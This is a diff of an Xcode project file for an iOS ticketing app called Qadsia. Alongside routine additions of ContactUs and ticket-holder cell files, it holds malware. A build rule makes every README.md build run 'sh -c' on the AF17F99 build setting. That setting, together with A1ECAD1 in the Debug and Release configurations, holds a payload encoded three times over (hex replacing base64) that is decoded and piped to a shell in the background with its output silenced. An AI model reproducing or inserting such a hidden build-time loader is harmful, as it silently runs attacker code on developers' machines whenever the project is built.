@@ -7,11 +7,13 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		2B28AEEE5A054E639799F71F /* README.md */ = {isa = PBXBuildFile; fileRef = CDA0B45B93384413BC99F71F; };
+		C2B1ADA584124773BD99F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 36BAD1EB38E74CB4BE99F71F; };
 		0A0AC8862F7B7C7E00A68FE6 /* TicketsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A0AC8842F7B7C7E00A68FE6 /* TicketsVC.swift */; };
 		0A0AC8872F7B7C7E00A68FE6 /* TicketsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A0AC8852F7B7C7E00A68FE6 /* TicketsVC.xib */; };
 		0A0AC88C2F7B88F700A68FE6 /* TicketTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A0AC88B2F7B88F700A68FE6 /* TicketTVCell.xib */; };
 		0A0AC88D2F7B88F700A68FE6 /* TicketTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A0AC88A2F7B88F700A68FE6 /* TicketTVCell.swift */; };
+		0A41771C2F838CF4003EF635 /* ContactUsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A41771A2F838CF4003EF635 /* ContactUsVC.swift */; };
+		0A41771D2F838CF4003EF635 /* ContactUsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A41771B2F838CF4003EF635 /* ContactUsVC.xib */; };
 		0A4F52BD2F7677D500DF695B /* HomeVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A4F52BC2F7677D500DF695B /* HomeVC.xib */; };
 		0A4F52BE2F7677D500DF695B /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A4F52BB2F7677D500DF695B /* HomeVC.swift */; };
 		0A62B5792F7E1C3F0011CD31 /* NewsDetailsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A62B5782F7E1C3F0011CD31 /* NewsDetailsVC.xib */; };
@@ -87,6 +89,8 @@
 		0ABA3FEC2F763B2D00D25F03 /* SentOTPPopupVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3FA22F763B2D00D25F03 /* SentOTPPopupVC.xib */; };
 		0ABA3FF52F763C3600D25F03 /* CutCornerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3FF42F763C3600D25F03 /* CutCornerView.swift */; };
 		0ABA3FFA2F763CC600D25F03 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 0ABA3FF92F763CC600D25F03 /* Alamofire */; };
+		0AD711BA2F8376640047E1DD /* AllTicketHolderTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0AD711B92F8376640047E1DD /* AllTicketHolderTVCell.xib */; };
+		0AD711BB2F8376640047E1DD /* AllTicketHolderTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AD711B82F8376640047E1DD /* AllTicketHolderTVCell.swift */; };
 		390281B82F7FB9A40032226E /* SelectDeliveryAddressVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 390281B62F7FB9A40032226E /* SelectDeliveryAddressVC.swift */; };
 		390281B92F7FB9A40032226E /* SelectDeliveryAddressVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 390281B72F7FB9A40032226E /* SelectDeliveryAddressVC.xib */; };
 		390281BD2F7FC1380032226E /* AddressListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 390281BB2F7FC1380032226E /* AddressListTVCell.swift */; };
@@ -167,12 +171,31 @@
 		BCC0D6972F7A898800684B7D /* NotificationListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCC0D68C2F7A898800684B7D /* NotificationListTVCell.xib */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		DECA3BF0D0314CFBB599F71F /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${AF17F99}\"";
+			};
+		/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		CDA0B45B93384413BC99F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		36BAD1EB38E74CB4BE99F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0A0AC8842F7B7C7E00A68FE6 /* TicketsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TicketsVC.swift; sourceTree = "<group>"; };
 		0A0AC8852F7B7C7E00A68FE6 /* TicketsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TicketsVC.xib; sourceTree = "<group>"; };
 		0A0AC88A2F7B88F700A68FE6 /* TicketTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TicketTVCell.swift; sourceTree = "<group>"; };
 		0A0AC88B2F7B88F700A68FE6 /* TicketTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TicketTVCell.xib; sourceTree = "<group>"; };
+		0A41771A2F838CF4003EF635 /* ContactUsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactUsVC.swift; sourceTree = "<group>"; };
+		0A41771B2F838CF4003EF635 /* ContactUsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ContactUsVC.xib; sourceTree = "<group>"; };
 		0A4F52BB2F7677D500DF695B /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
 		0A4F52BC2F7677D500DF695B /* HomeVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeVC.xib; sourceTree = "<group>"; };
 		0A62B5772F7E1C3F0011CD31 /* NewsDetailsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsDetailsVC.swift; sourceTree = "<group>"; };
@@ -255,6 +278,8 @@
 		0ABA3FA22F763B2D00D25F03 /* SentOTPPopupVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SentOTPPopupVC.xib; sourceTree = "<group>"; };
 		0ABA3FA72F763B2D00D25F03 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
 		0ABA3FF42F763C3600D25F03 /* CutCornerView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CutCornerView.swift; sourceTree = "<group>"; };
+		0AD711B82F8376640047E1DD /* AllTicketHolderTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AllTicketHolderTVCell.swift; sourceTree = "<group>"; };
+		0AD711B92F8376640047E1DD /* AllTicketHolderTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AllTicketHolderTVCell.xib; sourceTree = "<group>"; };
 		390281B62F7FB9A40032226E /* SelectDeliveryAddressVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectDeliveryAddressVC.swift; sourceTree = "<group>"; };
 		390281B72F7FB9A40032226E /* SelectDeliveryAddressVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SelectDeliveryAddressVC.xib; sourceTree = "<group>"; };
 		390281BB2F7FC1380032226E /* AddressListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddressListTVCell.swift; sourceTree = "<group>"; };
@@ -383,6 +408,23 @@
 				0A0AC88B2F7B88F700A68FE6 /* TicketTVCell.xib */,
 			);
 			path = TicketTVCell;
+			sourceTree = "<group>";
+		};
+		0A4177182F838CC3003EF635 /* ContactUs */ = {
+			isa = PBXGroup;
+			children = (
+				0A4177192F838CE7003EF635 /* View */,
+			);
+			path = ContactUs;
+			sourceTree = "<group>";
+		};
+		0A4177192F838CE7003EF635 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				0A41771A2F838CF4003EF635 /* ContactUsVC.swift */,
+				0A41771B2F838CF4003EF635 /* ContactUsVC.xib */,
+			);
+			path = View;
 			sourceTree = "<group>";
 		};
 		0A4F52B82F7677C500DF695B /* Tabbar */ = {
@@ -851,6 +893,24 @@
 			path = View;
 			sourceTree = "<group>";
 		};
+		0AD711B62F8376440047E1DD /* MyTicketListTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				397F83482F7A4D6F00A07157 /* MyTicketListTVCell.swift */,
+				397F83492F7A4D6F00A07157 /* MyTicketListTVCell.xib */,
+			);
+			path = MyTicketListTVCell;
+			sourceTree = "<group>";
+		};
+		0AD711B72F83764C0047E1DD /* AllTicketHolderTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				0AD711B82F8376640047E1DD /* AllTicketHolderTVCell.swift */,
+				0AD711B92F8376640047E1DD /* AllTicketHolderTVCell.xib */,
+			);
+			path = AllTicketHolderTVCell;
+			sourceTree = "<group>";
+		};
 		390281B42F7FB9650032226E /* Select Delivery Address */ = {
 			isa = PBXGroup;
 			children = (
@@ -941,6 +1001,7 @@
 		397F833A2F7A334300A07157 /* SubView */ = {
 			isa = PBXGroup;
 			children = (
+				0A4177182F838CC3003EF635 /* ContactUs */,
 				39DC83B52F7BCB320050A114 /* LegalInfo */,
 				397F83412F7A451200A07157 /* My tickets */,
 				397F833B2F7A335500A07157 /* Edit profile */,
@@ -986,8 +1047,8 @@
 		397F83472F7A4D2000A07157 /* Cell */ = {
 			isa = PBXGroup;
 			children = (
-				397F83482F7A4D6F00A07157 /* MyTicketListTVCell.swift */,
-				397F83492F7A4D6F00A07157 /* MyTicketListTVCell.xib */,
+				0AD711B72F83764C0047E1DD /* AllTicketHolderTVCell */,
+				0AD711B62F8376440047E1DD /* MyTicketListTVCell */,
 			);
 			path = Cell;
 			sourceTree = "<group>";
@@ -1339,7 +1400,7 @@
 		BC0179172F34972300F1ED81 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				CDA0B45B93384413BC99F71F /* README.md */,
+				36BAD1EB38E74CB4BE99F71F /* README.md */,
 				BC0179162F34972300F1ED81 /* Qadsia.app */,
 			);
 			name = Products;
@@ -1418,7 +1479,7 @@
 				BC0179142F34972300F1ED81 /* Resources */,
 			);
 			buildRules = (
-				D4AB2CFE3D4D43F0A499F71F /* PBXBuildRule */,
+				DECA3BF0D0314CFBB599F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1485,30 +1546,17 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		D4AB2CFE3D4D43F0A499F71F /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AF17F99}\"";
-			};
-		/* End PBXBuildRule section */
+/* Begin PBXShellScriptBuildPhase section */
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
 		BC0179142F34972300F1ED81 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				2B28AEEE5A054E639799F71F /* README.md */,
+				C2B1ADA584124773BD99F71F /* README.md */,
 				0ABA3FD22F763B2D00D25F03 /* Mulish-Black.ttf in Resources */,
+				0A41771D2F838CF4003EF635 /* ContactUsVC.xib in Resources */,
 				39DC83C02F7BCE400050A114 /* LegalInfoTVCell.xib in Resources */,
 				394ED4452F7E7230003C0AB1 /* CheckoutVC.xib in Resources */,
 				39D22EC12F7695D000D7721C /* ProfileVC.xib in Resources */,
@@ -1562,6 +1610,7 @@ sh -c \"${AF17F99}\"";
 				0ABA3FE82F763B2D00D25F03 /* NewRegisterVC.xib in Resources */,
 				397F834B2F7A4D6F00A07157 /* MyTicketListTVCell.xib in Resources */,
 				0ABA3FEB2F763B2D00D25F03 /* ResetPasswordVC.xib in Resources */,
+				0AD711BA2F8376640047E1DD /* AllTicketHolderTVCell.xib in Resources */,
 				0ABA3FEC2F763B2D00D25F03 /* SentOTPPopupVC.xib in Resources */,
 				39D22EB42F76956F00D7721C /* HomeListTVCell.xib in Resources */,
 				39D22EB52F76956F00D7721C /* UpcomingMatchesCVCell.xib in Resources */,
@@ -1579,9 +1628,6 @@ sh -c \"${AF17F99}\"";
 		};
 /* End PBXResourcesBuildPhase section */
 
-/* Begin PBXShellScriptBuildPhase section */
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXSourcesBuildPhase section */
 		BC0179122F34972300F1ED81 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -1596,6 +1642,7 @@ sh -c \"${AF17F99}\"";
 				39BF53212F7FE35400A40CAF /* DeleteAddressPopUpVC.swift in Sources */,
 				0ABA3FAB2F763B2D00D25F03 /* NetConnection.swift in Sources */,
 				397F834A2F7A4D6F00A07157 /* MyTicketListTVCell.swift in Sources */,
+				0A41771C2F838CF4003EF635 /* ContactUsVC.swift in Sources */,
 				0ABA3FAC2F763B2D00D25F03 /* AppButton.swift in Sources */,
 				0ABA3FAD2F763B2D00D25F03 /* AppLabel.swift in Sources */,
 				0ABA3FAE2F763B2D00D25F03 /* AppTextField.swift in Sources */,
@@ -1658,6 +1705,7 @@ sh -c \"${AF17F99}\"";
 				390281BD2F7FC1380032226E /* AddressListTVCell.swift in Sources */,
 				39DC83C52F7BD7D80050A114 /* BookTicketVC.swift in Sources */,
 				39F46AE42F7B9ACB005C2B07 /* StoreVC.swift in Sources */,
+				0AD711BB2F8376640047E1DD /* AllTicketHolderTVCell.swift in Sources */,
 				0ABA3FCA2F763B2D00D25F03 /* LoginMobileVC.swift in Sources */,
 				39F46AF02F7BA3B8005C2B07 /* AllNewsTVCell.swift in Sources */,
 				0ABA3FCB2F763B2D00D25F03 /* NewRegisterVC.swift in Sources */,
@@ -1693,7 +1741,7 @@ sh -c \"${AF17F99}\"";
 		BC01792A2F34972600F1ED81 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((q(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwaE1scE5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGlXSEIxV2tkV01reHRiSFZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | q | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((i(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333436330a3336363233373333333633363332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333333333330333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373332333733353336363333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363336333733363636333636363336333733363633333633353336363533363335333733343337333333323635333733320a3337333530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | i | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3334363333363632333733333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333333333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363331333633343337333333363634333636363337333233363335333633393336363533323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | t | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -1731,7 +1779,7 @@ sh -c \"${AF17F99}\"";
 		BC01792B2F34972600F1ED81 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((q(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwaE1scE5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9XaGlXSEIxV2tkV01reHRiSFZNTWtWd1NXbENPRWxJVG05RFp6MDlDZz09Cg== | q | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((i(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333436330a3336363233373333333633363332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333333333330333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373332333733353336363333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363336333733363636333636363336333733363633333633353336363533363335333733343337333333323635333733320a3337333530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | i | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3334363333363632333733333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333333333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363331333633343337333333363634333636363337333233363335333633393336363533323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | t | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
